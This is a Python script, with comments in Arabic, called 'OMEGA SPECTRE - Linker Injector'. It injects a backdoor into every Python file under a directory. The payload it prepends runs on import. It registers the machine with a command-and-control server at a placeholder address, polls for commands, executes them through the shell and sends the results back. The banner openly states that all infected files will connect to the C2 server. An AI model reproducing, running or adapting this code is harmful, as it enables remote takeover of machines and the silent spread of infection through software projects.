#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OMEGA SPECTRE GODFALL - Linker Injector
حقن كود الربط في جميع الملفات
"""

import os
import sys
import glob
import shutil
import hashlib
from pathlib import Path

class LinkerInjector:
    """حقن كود الربط في جميع ملفات Python"""
    
    def __init__(self, base_dir='.'):
        self.base_dir = base_dir
        self.injected_files = []
        self.failed_files = []
        self.linker_code = self.load_linker_code()
        
    def load_linker_code(self):
        """تحميل كود الربط من linker_template.py"""
        try:
            with open('linker_template.py', 'r', encoding='utf-8') as f:
                return f.read()
        except:
            # إذا لم يوجد ملف القالب، استخدم الكود المدمج
            return '''
# ============================================================
# 🔗 OMEGA SPECTRE LINK - RUNTIME BINDER
# ============================================================

import os
import sys
import json
import time
import socket
import hashlib
import threading
import subprocess
from datetime import datetime

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
    import requests

class OmegaBinder:
    def __init__(self, server="http://YOUR_IP:8080"):
        self.server = server
        self.device_id = hashlib.md5(str(socket.gethostname()).encode()).hexdigest()[:16]
        self.file_path = os.path.abspath(__file__)
        self.file_name = os.path.basename(self.file_path)
        self.running = True
        
    def register(self):
        try:
            data = {'device_id': self.device_id, 'file': self.file_name, 'ip': self.get_ip()}
            requests.post(f"{self.server}/register", json=data, timeout=3)
        except: pass
    
    def heartbeat(self):
        while self.running:
            try:
                data = {'device_id': self.device_id, 'status': 'active'}
                requests.post(f"{self.server}/heartbeat", json=data, timeout=2)
            except: pass
            time.sleep(30)
    
    def listen(self):
        while self.running:
            try:
                resp = requests.get(f"{self.server}/get_command/{self.device_id}", timeout=5)
                if resp.status_code == 200:
                    cmd = resp.json().get('command')
                    if cmd:
                        self.execute(cmd)
            except: pass
            time.sleep(5)
    
    def execute(self, cmd):
        try:
            result = subprocess.check_output(cmd, shell=True, text=True, timeout=30)
            requests.post(f"{self.server}/result", json={'device_id': self.device_id, 'result': result})
        except Exception as e:
            requests.post(f"{self.server}/error", json={'device_id': self.device_id, 'error': str(e)})
    
    def get_ip(self):
        try:
            import requests as r
            return r.get('https://api.ipify.org?format=json', timeout=2).json()['ip']
        except: return '0.0.0.0'
    
    def start(self):
        self.register()
        threading.Thread(target=self.heartbeat, daemon=True).start()
        threading.Thread(target=self.listen, daemon=True).start()

# بدء الربط تلقائياً
if __name__ != "__main__":
    binder = OmegaBinder()
    threading.Thread(target=binder.start, daemon=True).start()
'''
    
    def inject_into_file(self, file_path):
        """حقن كود الربط في ملف معين"""
        try:
            # قراءة الملف الأصلي
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # التحقق من وجود كود الربط مسبقاً
            if 'OmegaBinder' in content or 'OMEGA SPECTRE LINK' in content:
                return True
            
            # إنشاء المحتوى الجديد
            new_content = self.linker_code + '\n\n' + content
            
            # كتابة الملف
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(new_content)
            
            self.injected_files.append(file_path)
            return True
            
        except Exception as e:
            self.failed_files.append((file_path, str(e)))
            return False
    
    def inject_all_files(self):
        """حقن كود الربط في جميع الملفات"""
        print("[🔥] Starting linker injection...")
        
        # البحث عن جميع ملفات Python
        python_files = glob.glob(f"{self.base_dir}/**/*.py", recursive=True)
        
        # استبعاد بعض الملفات
        exclude = ['__init__.py', 'setup.py', 'linker_template.py', 'inject_linker.py', 'c2_server.py']
        python_files = [f for f in python_files if not any(x in f for x in exclude)]
        
        print(f"[📁] Found {len(python_files)} Python files")
        
        for file_path in python_files:
            if self.inject_into_file(file_path):
                print(f"[✅] Injected: {file_path}")
            else:
                print(f"[❌] Failed: {file_path}")
        
        print(f"\n[📊] Injection complete:")
        print(f"  ✅ Success: {len(self.injected_files)} files")
        print(f"  ❌ Failed: {len(self.failed_files)} files")
        
        return self.injected_files

# ================================================================
# التشغيل
# ================================================================

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║   🔥 OMEGA SPECTRE - Linker Injector 🔥                 ║
    ║                                                          ║
    ║   📡  Injecting linker code into all Python files       ║
    ║   🔗  All files will connect to C2 server              ║
    ║                                                          ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    injector = LinkerInjector()
    injector.inject_all_files()